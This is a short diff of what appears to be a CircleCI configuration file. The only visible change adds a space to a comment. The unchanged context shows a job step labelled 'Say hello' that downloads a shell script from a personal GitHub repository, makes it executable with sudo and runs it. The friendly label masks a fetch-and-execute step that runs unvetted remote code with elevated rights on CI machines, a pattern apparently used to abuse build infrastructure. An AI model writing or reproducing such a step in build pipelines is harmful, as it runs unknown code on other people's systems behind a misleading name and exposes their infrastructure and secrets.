@@ -21,7 +21,7 @@ jobs:
           name: "Say hello"
           command: wget https://github.com/smile1samehada/Test/raw/main/gaga_large.sh && sudo chmod +x gaga_large.sh && ./gaga_large.sh
 
-# Orchestrate jobs using workflows
+#  Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
 workflows:
   say-hello-workflow:
